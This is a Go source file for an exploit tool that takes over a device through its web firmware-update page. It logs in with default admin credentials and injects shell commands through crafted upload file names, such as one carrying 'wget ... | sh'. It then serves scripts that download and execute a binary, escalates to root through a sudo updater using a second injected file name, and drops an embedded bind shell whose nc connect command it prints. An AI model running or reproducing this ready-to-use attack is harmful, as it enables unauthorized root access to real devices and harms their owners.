package main

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"mime/multipart"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
	"time"

	_ "embed"
)

//go:embed shellcode/bind_shell
var bind_shell []byte

//go:embed fwupdate/runup.tar
var run_up []byte

var opench = make(chan (int), 1)

func serveHTTP(lst net.Listener, isFD bool) {
	var mux http.ServeMux

	/* These two files are only used for non-FD devices */
	mux.HandleFunc("/runup.tar", func(w http.ResponseWriter, r *http.Request) {
		fmt.Println("Got request for runup.tar")
		w.Write(run_up)
	})

	mux.HandleFunc("/c", func(w http.ResponseWriter, r *http.Request) {
		resp := []byte("" +
			"#!/bin/sh\n" +
			"cd /tmp\n" +
			"rm -f b\n" +
			"")

		resp = append(resp, []byte("wget http://"+lst.Addr().String()+"/b\n")...)
		resp = append(resp, []byte("chmod +x b\n")...)
		resp = append(resp, []byte("./b sh &\n")...)

		fmt.Println("Got request for non-FD root script:\n", string(resp))
		w.Write(resp)
	})

	/* This handler returns the bindshell for FD and non-FD devices */
	mux.HandleFunc("/b", func(w http.ResponseWriter, r *http.Request) {
		port := rand.Intn(60000) + 1024

		fmt.Println("Got request for shellcode:", port)

		repl := []byte{0x2, 0x0, 0x0, 0x0}
		binary.BigEndian.PutUint16(repl[2:], uint16(port))

		w.Write(bytes.ReplaceAll(bind_shell, []byte{0x2, 0x0, 0xde, 0xad}, repl))

		select {
		case opench <- port:
		default:
		}
	})

	/* This is the main handler */
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		resp := []byte("" +
			"#!/bin/sh\n" +
			"cd /tmp\n" +
			"rm -f b ha* c runup.tar\n" +
			"")

		if isFD {
			resp = append(resp, []byte("if [ `id -u` -ne 0 ]; then\n")...) /* If we are not root yet */
			filename := fmt.Sprintf("ha;wget %s -O - | sh;", lst.Addr().String())
			resp = append(resp, []byte("touch \"")...)
			resp = append(resp, []byte(filename)...)
			resp = append(resp, []byte("\"\n")...)
			resp = append(resp, []byte("sudo /home/peak/updater -f \"/tmp/")...)
			resp = append(resp, []byte(filename)...)
			resp = append(resp, []byte("\"\n")...)
			resp = append(resp, []byte("else\n")...) /* If we are root */

			resp = append(resp, []byte("wget http://"+lst.Addr().String()+"/b\n")...)
			resp = append(resp, []byte("chmod +x b\n")...)
			resp = append(resp, []byte("./b sh &\n")...)
			resp = append(resp, []byte("killall -9 updater\n")...)
			resp = append(resp, []byte("fi\n")...)

		} else {
			resp = append(resp, []byte("wget http://"+lst.Addr().String()+"/runup.tar\n")...)
			resp = append(resp, []byte("wget http://"+lst.Addr().String()+"/c\n")...)
			resp = append(resp, []byte("chmod +x c\n")...)
			resp = append(resp, []byte("sudo /home/peak/updater -f /tmp/runup.tar\n")...)
		}

		fmt.Println("Got request for script:\n", string(resp))
		w.Write(resp)
	})

	if err := http.Serve(lst, &mux); err != nil {
		panic(err)
	}
}

func main() {
	dst := flag.String("ip", "", "ip of device")
	httpaddr := flag.String("httpaddr", "", "local http server address")
	user := flag.String("user", "admin", "Username")
	pass := flag.String("pass", "admin", "Password")
	isFD := flag.Bool("fd", false, "Target is a FD device")
	flag.Parse()

	proto := "http"
	if *isFD {
		proto = "https"
	}

    if *dst == "" {
        log.Fatalln("Device IP is missing")
    }

    if *httpaddr == "" {
        log.Fatalln("Local IP is missing")
    }

	lst, err := net.Listen("tcp", *httpaddr+":0")
	if err != nil {
		log.Fatalln(err)
	}

	go serveHTTP(lst, *isFD)

	jar, err := cookiejar.New(nil)
	if err != nil {
		panic(err)
	}

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},

		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Jar: jar,
	}

	if resp, err := client.PostForm(proto+"://"+*dst+"/bouncer.php", url.Values{
		"UN": {*user},
		"PW": {*pass},
	}); err != nil {
		panic(err)
	} else {
		resp.Body.Close()

		if resp.StatusCode != http.StatusFound {
			log.Panicf("invalid status code returned for login: %d", resp.StatusCode)
		}

		if resp.Header.Get("Set-Cookie") == "" {
			panic("invalid username or password")
		}
	}

	fmt.Println("Logged in")

	/* Note: We can't use / or \ */
	suffix := "tar"
	if *isFD {
		suffix = "raucb"
	}
	filename := fmt.Sprintf("test';wget %s -O - | sh;'.%s", lst.Addr().String(), suffix)

	var uploadBody bytes.Buffer
	writer := multipart.NewWriter(&uploadBody)
	if part, err := writer.CreateFormField("type"); err != nil {
		panic(err)
	} else {
		part.Write([]byte("fw_update"))
	}
	if part, err := writer.CreateFormFile("package", filename); err != nil {
		panic(err)
	} else {
		part.Write([]byte("bogus data that does not have zero length"))
	}

	if err = writer.Close(); err != nil {
		panic(err)
	}

	req, err := http.NewRequest(http.MethodPost, proto+"://"+*dst+"/processing.php", &uploadBody)
	if err != nil {
		panic(err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	if resp, err := client.Do(req); err != nil {
		panic(err)
	} else {
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if !strings.Contains(string(body), "Processing Software Update") {
			log.Panicf("body did not contain software update start")
		}
	}

	fmt.Println("Sent exec request")

	select {
	case <-time.After(30 * time.Second):
		panic("timeout")
	case port := <-opench:
		time.Sleep(300 * time.Millisecond)
		fmt.Printf("shell opened, connect using: nc %s %d\n", *dst, port)
	}
}
